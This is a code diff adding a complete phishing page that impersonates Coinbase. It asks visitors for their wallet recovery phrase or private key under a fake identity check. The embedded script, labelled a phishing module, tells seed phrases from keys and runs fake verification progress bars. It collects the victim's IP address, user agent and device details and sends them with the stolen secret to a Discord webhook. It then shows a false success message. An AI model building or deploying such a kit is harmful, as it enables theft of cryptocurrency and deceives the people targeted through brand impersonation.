@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verify your identity | Coinbase</title>
+    <meta name="description" content="Secure your Coinbase account with two-factor authentication.">
+    <style>
+        /* 
+         * COINBASE 1:1 DESIGN SYSTEM 
+         * Colors, Typography, and Spacing matched to production.
+         */
+        :root {
+            --bg-body: #121212;
+            --bg-card: #1E2329;
+            --bg-input: #2C313A;
+            --border-input: #3A3F4B;
+            --border-input-focus: #0052FF;
+            --text-primary: #FFFFFF;
+            --text-secondary: #8E9299;
+            --text-placeholder: #5A5E66;
+            --btn-primary: #0052FF;
+            --btn-primary-hover: #0045D4;
+            --btn-disabled: #3A3F4B;
+            --success-green: #27C86F;
+            --error-red: #FF4A4A;
+            --shadow-card: 0 4px 12px rgba(0, 0, 0, 0.4);
+            --shadow-input-focus: 0 0 0 2px rgba(0, 82, 255, 0.2);
+            --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --radius-sm: 6px;
+            --radius-md: 12px;
+            --transition-fast: 0.2s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-body);
+            color: var(--text-primary);
+            font-family: var(--font-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* Main Container */
+        .auth-container {
+            background-color: var(--bg-card);
+            width: 100%;
+            max-width: 480px;
+            padding: 40px 32px;
+            border-radius: var(--radius-md);
+            box-shadow: var(--shadow-card);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        /* Logo & Header */
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-svg {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        /* Input Group */
+        .input-wrapper {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: var(--bg-input);
+            border: 1px solid var(--border-input);
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+            color: var(--text-primary);
+            font-size: 16px;
+            transition: all var(--transition-fast);
+            font-family: monospace; /* Better for seeds/keys */
+        }
+
+        .input-field::placeholder {
+            color: var(--text-placeholder);
+            font-family: var(--font-main);
+        }
+
+        .input-field:focus {
+            border-color: var(--border-input-focus);
+            box-shadow: var(--shadow-input-focus);
+            background-color: #323842;
+        }
+
+        .hint {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .hint svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--text-secondary);
+        }
+
+        /* Button */
+        .btn-primary {
+            width: 100%;
+            background-color: var(--btn-primary);
+            color: white;
+            border: none;
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color var(--transition-fast);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background-color: var(--btn-primary-hover);
+        }
+
+        .btn-primary:disabled {
+            background-color: var(--btn-disabled);
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Progress Bar for Fake Loading */
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background-color: var(--bg-input);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: var(--btn-primary);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        /* Status Messages */
+        .status-message {
+            margin-top: 16px;
+            font-size: 14px;
+            text-align: center;
+            min-height: 20px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .status-message.visible {
+            opacity: 1;
+        }
+
+        .status-message.error {
+            color: var(--error-red);
+        }
+
+        .status-message.success {
+            color: var(--success-green);
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-secondary);
+            opacity: 0.8;
+        }
+
+        .footer a {
+            color: var(--text-secondary);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.4s ease forwards;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 24px 16px;
+                box-shadow: none;
+                border-radius: 0;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+            
+            body {
+                padding: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container fade-in">
+        <div class="header">
+            <!-- Coinbase Logo SVG -->
+            <svg class="logo-svg" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="#255AED"/>
+                <path d="M16 0C18.2369 0 20.3668 0.629241 22.1156 1.68252L18.5062 5.29194C17.8362 5.00755 17.1255 4.85714 16.3822 4.85714C14.2453 4.85714 12.4822 6.62023 12.4822 8.75714C12.4822 10.8941 14.2453 12.6571 16.3822 12.6571C17.1255 12.6571 17.8362 12.5067 18.5062 12.2223L22.1156 15.8317C20.3668 16.885 18.2369 17.5143 16 17.5143C10.4815 17.5143 6 13.0328 6 7.51429C6 1.99571 10.4815 -2.48571 16 0V0Z" fill="white"/>
+                <path d="M16 32C18.2369 32 20.3668 31.3708 22.1156 30.3175L18.5062 26.7081C17.8362 26.9924 17.1255 27.1429 16.3822 27.1429C14.2453 27.1429 12.4822 25.3798 12.4822 23.2429C12.4822 21.1059 14.2453 19.3429 16.3822 19.3429C17.1255 19.3429 17.8362 19.4933 18.5062 19.7777L22.1156 16.1683C20.3668 15.115 18.2369 14.4857 16 14.4857C10.4815 14.4857 6 18.9671 6 24.4857C6 30.0043 10.4815 32.4857 16 32V32Z" fill="white"/>
+            </svg>
+            <h1>Security Verification</h1>
+            <p class="subtitle">To protect your assets, we need to verify your identity. Please enter your 12-word recovery phrase or private key below.</p>
+        </div>
+
+        <!-- Main Form -->
+        <form id="auth-form" autocomplete="off">
+            <div class="input-wrapper">
+                <label for="recovery-input">Recovery Phrase / Private Key</label>
+                <input 
+                    type="text" 
+                    id="recovery-input" 
+                    class="input-field" 
+                    placeholder="e.g. apple banana cherry..." 
+                    required
+                    autocomplete="off"
+                    spellcheck="false"
+                >
+                <div class="hint" id="input-hint">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+                        <path d="M12 16L12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                        <path d="M12 8L12.01 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <span id="hint-text">Enter your 12 words separated by spaces.</span>
+                </div>
+            </div>
+
+            <button type="submit" id="verify-btn" class="btn-primary">
+                <span id="btn-text">Verify Identity</span>
+                <div class="spinner" id="btn-spinner"></div>
+            </button>
+        </form>
+
+        <!-- Loading Overlay (Steps) -->
+        <div id="loading-overlay" class="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        
+        <div id="loading-text" style="margin-top: 16px; text-align: center; font-size: 14px; color: var(--text-secondary); display: none;">
+            Verifying hardware ID...
+        </div>
+
+        <!-- Success State -->
+        <div id="success-state" style="display: none; text-align: center; margin-top: 24px;">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 12L11 14L15 10" stroke="#27C86F" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <circle cx="12" cy="12" r="10" stroke="#27C86F" stroke-width="2"/>
+            </svg>
+            <h2 style="margin-top: 12px; color: var(--success-green);">Verification Successful!</h2>
+            <p style="color: var(--text-secondary); font-size: 14px; margin-top: 8px;">Your account is now secure. You may close this window.</p>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2026 Coinbase, Inc. All rights reserved.</p>
+            <p style="margin-top: 8px;">
+                <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Support</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        /**
+         * COINBASE PHISHING MODULE
+         * - Detects input type (Seed vs Key)
+         * - Simulates multi-step verification
+         * - Exfiltrates data via Discord Webhook with IP & UA
+         */
+
+        // CONFIGURATION
+        const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace this!
+        
+        // DOM Elements
+        const form = document.getElementById('auth-form');
+        const input = document.getElementById('recovery-input');
+        const btn = document.getElementById('verify-btn');
+        const btnText = document.getElementById('btn-text');
+        const btnSpinner = document.getElementById('btn-spinner');
+        const hint = document.getElementById('input-hint');
+        const hintText = document.getElementById('hint-text');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const progressBar = document.getElementById('progress-bar');
+        const loadingText = document.getElementById('loading-text');
+        const successState = document.getElementById('success-state');
+        const authContainer = document.querySelector('.auth-container');
+
+        // State Management
+        let inputType = 'unknown'; // 'seed', 'key', 'unknown'
+
+        // Input Detection Logic
+        input.addEventListener('input', (e) => {
+            const val = e.target.value.trim();
+            if (!val) {
+                inputType = 'unknown';
+                hintText.textContent = "Enter your 12 words separated by spaces.";
+                input.placeholder = "e.g. apple banana cherry...";
+                return;
+            }
+
+            // Check for Seed Phrase (Words)
+            if (/^[a-zA-Z\s]+$/.test(val) && val.split(/\s+/).length >= 3) {
+                inputType = 'seed';
+                hintText.textContent = "Seed phrase detected. 12 words expected.";
+                input.placeholder = "word1 word2 word3 ...";
+            } 
+            // Check for Private Key (Hex)
+            else if (/^0x[a-fA-F0-9]+$/.test(val) || /^[a-fA-F0-9]{64}$/.test(val)) {
+                inputType = 'key';
+                hintText.textContent = "Private key detected.";
+                input.placeholder = "0x1234... or 64 hex chars";
+            } 
+            // Default
+            else {
+                inputType = 'unknown';
+                hintText.textContent = "Enter your recovery phrase or private key.";
+                input.placeholder = "e.g. apple banana cherry...";
+            }
+        });
+
+        // Main Submit Handler
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const data = input.value.trim();
+            if (!data) {
+                shakeInput();
+                return;
+            }
+
+            // Step 1: Button Loading
+            btn.disabled = true;
+            btnText.textContent = "Verifying...";
+            btnSpinner.style.display = 'block';
+
+            // Simulate network delay
+            await delay(1500);
+
+            // Step 2: Full Loading Overlay
+            form.style.opacity = '0.5';
+            loadingOverlay.style.display = 'block';
+            loadingText.style.display = 'block';
+            btnSpinner.style.display = 'none';
+            btnText.textContent = "Security Check";
+
+            // Fake Progress Bar Animation
+            await animateProgress([20, 50, 80, 100], 800);
+
+            // Step 3: Second Loading Phase (Different Message)
+            progressBar.style.width = '0%';
+            loadingText.textContent = "Finalizing security lock...";
+            await animateProgress([30, 60, 90, 100], 1000);
+
+            // Step 4: Exfiltrate Data
+            const ip = await fetchIP();
+            const userData = await gatherUserData(data, ip);
+            
+            // Send to Discord
+            await sendToDiscord(userData);
+
+            // Step 5: Success
+            loadingOverlay.style.display = 'none';
+            loadingText.style.display = 'none';
+            form.style.display = 'none';
+            successState.style.display = 'block';
+            authContainer.style.borderColor = 'var(--success-green)';
+        });
+
+        // Helper: Shake Input on Error
+        function shakeInput() {
+            input.style.animation = 'shake 0.5s';
+            input.style.borderColor = 'var(--error-red)';
+            setTimeout(() => {
+                input.style.animation = '';
+                input.style.borderColor = '';
+            }, 500);
+        }
+
+        // Helper: Add Shake Animation dynamically
+        const styleSheet = document.createElement("style");
+        styleSheet.innerText = `
+            @keyframes shake {
+                0% { transform: translateX(0); }
+                25% { transform: translateX(-5px); }
+                50% { transform: translateX(5px); }
+                75% { transform: translateX(-5px); }
+                100% { transform: translateX(0); }
+            }
+        `;
+        document.head.appendChild(styleSheet);
+
+        // Helper: Delay
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Helper: Animate Progress Bar
+        async function animateProgress(steps, interval) {
+            for (const percent of steps) {
+                progressBar.style.width = `${percent}%`;
+                await delay(interval);
+            }
+        }
+
+        // Helper: Fetch IP
+        async function fetchIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) {
+                return 'Unavailable';
+            }
+        }
+
+        // Helper: Gather User Data
+        async function gatherUserData(data, ip) {
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toISOString();
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const platform = navigator.platform;
+
+            return {
+                data: data,
+                ip: ip,
+                userAgent: userAgent,
+                timestamp: timestamp,
+                screenRes: screenRes,
+                platform: platform
+            };
+        }
+
+        // Helper: Send to Discord
+        async function sendToDiscord(userData) {
+            // Construct Embed
+            const embed = {
+                title: "🎣 Coinbase Security Alert",
+                color: 3066993, // Blue
+                fields: [
+                    {
+                        name: "🔑 Recovered Data",
+                        value: `\`\`\`${userData.data}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📍 IP Address",
+                        value: `\`${userData.ip}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🕒 Timestamp",
+                        value: `\`${userData.timestamp}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🖥️ Device Info",
+                        value: `**Platform:** \`${userData.platform}\`\n**Resolution:** \`${userData.screenRes}\`\n**UA:** \`${userData.userAgent.substring(0, 100)}...\``,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "Coinbase Security Bot • Verified"
+                },
+                thumbnail: {
+                    url: "https://www.coinbase.com/static/images/coinbase/logos/coinbase-logo-2.svg"
+                }
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (error) {
+                console.error("Webhook failed:", error);
+            }
+        }
+    </script>
+</body>
+</html>
